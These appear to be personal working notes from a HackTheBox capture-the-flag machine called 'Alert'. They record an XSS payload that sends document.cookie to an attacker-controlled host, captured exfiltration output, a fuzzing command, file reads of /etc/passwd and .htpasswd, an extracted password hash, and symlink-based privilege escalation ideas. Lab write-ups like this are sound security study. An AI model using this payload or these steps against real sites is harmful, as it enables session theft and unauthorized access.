xss attack involved somehow
messages.php file 
GET /visualizer.php?link_share=67a040e2ae3a13.51990107.md HTTP/1.1
Host: alert.htb
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Connection: close
Cache-Control: max-age=0

what is this link_share?
there is a link_share url that gets used first? how that work 
how is the linkshare url generated? not entirely sure 
67a040e2ae3a13.51990107.md
67a041a1813148.20603673.md

no cookies or anyhthing is used though?




2/3

<script>image = new Image(); image.src="http://10.10.14.8:8000/?c="+document.cookie;</script>
works locally 
- [ ] grab the link generated
- [ ] fuzz for the login site 
- [ ] send the link to the admin
http://alert.htb/visualizer.php?link_share=67a1462f3eded3.07935576.md

clicked on immediately but what data should they be sending over


└─$ ffuf -w /usr/share/dirb/wordlists/big.txt -request hackthebox/alert/request.txt -v -u http://alert.htb -fc
 301
this finds statistics
i think there is something related to the headers that are sent when we dont use the actual request that was captured in the burp proxy 
not sure what to send back 

need to enumerate more information using the js code exec

okay, cannot access the webpage for because of the access-control-allow-origin header disallows cross origin requests

what pieces of the puzzle do i have?
i have xss attack and can take data
doesnt seem like i can access the statistics page because of the cors origin header

http://alert.htb/visualizer.php?link_share=67a161c8046ca0.39489592.md 
trying to hit the /messages endpoint also doesnt do anything it seems
there might be other hidden links?


- [!] statistics
- [x] messages
    <-- was missing the .php extension
- [ ] write code to automate the exfiltration instead of doing it manually please 

"GET /?c=%3Ch1%3EMessages%3C/h1%3E%3Cul%3E%3Cli%3E%3Ca%20href=%27messages.p
hp?file=2024-03-10_15-48-34.txt%27%3E2024-03-10_15-48-34.txt%3C/a%3E%3C/li%3E%3C/ul%3E HTTP/1.1" 200 -


cannot read this file, but let's try other files
/etc/passwd not working so we can only read certain types of files?
htpasswd doesnt seem to be working
/etc/passwd not returning anything 
not sure if the file read is actually working tbh

might be the links that work do not return an actual header so maybe there is some other way to access them?
both of the ones do not return anything
it could also be that they are not readable by the current user
/etc/passwd 
/etc/apache2/htpass/.htpasswd
ok it might be the case that we got data back but we cannot parse it properly actually 
it's probably not working because we're getting back a promise maybe?

- [ ] upload md file
- [ ] send contact request and parse the data received


<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>

fbe8fbe29c9f75972ff9ae4456d2cf26


tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      1 10.10.11.44:40130       8.8.8.8:53              SYN_SENT    on (6.02/3/0)
tcp        0     36 10.10.11.44:22          10.10.14.8:60886        ESTABLISHED on (0.21/0/0)
tcp        0      0 127.0.0.1:34766         127.0.0.1:80            TIME_WAIT   timewait (53.18/0/0)
tcp        0      0 127.0.0.1:34764         127.0.0.1:80            TIME_WAIT   timewait (53.18/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)

something running on port 8080 but it's not working?

i currently do not know what to look for in this code 
not sure how to use the monitoring software to elevate my privileges and also not sure how the user/group permissions works to get me root access
monitor.php uses configuration.php 
the code is saying for each monitor 
get some information about the monitor

important files:
config <- management group  (which we are in)
    config defines the path 
monitor.php <- uses config
monitors <- contains soft link to /etc/shadow and /root.txt <-- someone probably worked on this box before i did maybe? No, actually I think we can read these files using our put contents 
so we can control the PATH value 
can i put a shell somewhere in file get contents and putcontents?ls
so no need for a reverse shell we can do a file read 
curl_exec <-- seems we can get code exec from this maybe?
cannot modify monitors.json unless we can write to it somehow 
if the file exists for some name, then retrieve its contents and decode the json data 
then combine the data with the new data and truncate by 60 "somethings" so we only have the most recent data 
what hapepns if we decode non json data?
how frequently is the monitoring code called also? when does it get called?
no cronjobs i think so yea not sure when the code gets called 
we can call it with our php code maybe
permission failed if we just try to call it manually 
no cron jobs for root i think 
if we take the service down, does it start up again?

okay, regathering the pieces:
1) how do we get the monitor.php file to run / exec?
    <-- no cron tabs are available for root 
    <-- running php monitors.php gives us a permissions error 
2) what do we modify in the configuration.php file in order to get code exec?

much easier than this; no need to modify the configuration.php file or anything like that 
the application is already running as root so accessing files on the web portal will give us the ability to read root files / files with strong permissions


is there a file_get_contents injection?
seems like i cannot create a link 
- [ ] make a separate directory in /home/albert/monitors/alert.htb as a soft link to root.txt
- [ ] cd










